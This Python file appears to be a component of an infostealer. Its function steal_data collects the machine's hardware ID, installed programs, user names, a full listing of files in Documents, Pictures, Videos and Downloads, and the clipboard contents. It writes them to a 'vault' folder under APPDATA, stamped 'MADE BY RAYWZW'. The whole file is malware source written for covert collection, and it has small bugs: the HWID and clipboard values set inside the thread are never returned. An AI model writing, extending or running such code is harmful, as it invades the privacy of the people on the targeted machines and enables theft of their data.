import os
import pyperclip
import subprocess
import platform
import psutil
import threading
import uuid

def gather_system_info():
    def fetch_data(installed_apps, users, file_tree, clipboard_content):
        try:
            user_name = os.getlogin()
        except Exception as e:
            user_name = "Unknown"
        
        hwid = hex(uuid.getnode())
        
        python_version = platform.python_version()

        try:
            apps = subprocess.check_output('wmic product get name').decode().split('\n')
            installed_apps.extend([app.strip() for app in apps if app.strip()])
        except Exception as e:
            pass
        
        users.append(user_name)
        try:
            users.extend([user.name for user in psutil.users()])
        except Exception as e:
            pass
        
        try:
            for folder in ['Documents', 'Pictures', 'Videos', 'Downloads']:
                folder_path = os.path.join(os.getenv('USERPROFILE'), folder)
                if os.path.exists(folder_path):
                    file_tree.append(folder_path)
                    for dirpath, _, filenames in os.walk(folder_path):
                        for filename in filenames:
                            file_tree.append(os.path.join(dirpath, filename))
        except Exception as e:
            pass
        
        try:
            clipboard_content = pyperclip.paste()
        except Exception as e:
            clipboard_content = "Unknown"
    
    installed_apps = []
    users = []
    file_tree = []
    cc = pyperclip.paste()
    clipboard_content = f"{cc}"
    hwid = ""

    data_thread = threading.Thread(target=fetch_data, args=(installed_apps, users, file_tree, clipboard_content))
    data_thread.start()
    data_thread.join()

    return {
        'HWID': hwid,
        'Python Version': platform.python_version(),
        'Installed Apps': installed_apps,
        'Users': users,
        'File Tree': file_tree,
        'Clipboard': clipboard_content
    }

def save_data(data):
    try:
        vault_path = os.path.join(os.getenv('APPDATA'), 'vault', 'data')
        file_path = os.path.join(vault_path, 'sysinfo.txt')
        os.makedirs(vault_path, exist_ok=True)
        
        with open(file_path, 'w') as f:
            f.write(f"HWID: {data['HWID']}\n--------------MADE BY RAYWZW--------------\n")
            f.write(f"Python Version: {data['Python Version']}\n--------------MADE BY RAYWZW--------------\n")
            f.write("Installed Apps:\n")
            for app in data['Installed Apps']:
                f.write(f"- {app}\n")
            f.write(f"--------------MADE BY RAYWZW--------------\nUsers:\n")
            for user in data['Users']:
                f.write(f"- {user}\n")
            f.write(f"--------------MADE BY RAYWZW--------------\nFile Tree:\n")
            for file in data['File Tree']:
                f.write(f"- {file}\n")
            f.write(f"--------------MADE BY RAYWZW--------------\nClipboard Content:\n{data['Clipboard']}\n")
    except Exception as e:
        pass

def steal_data():
    data = gather_system_info()
    save_data(data)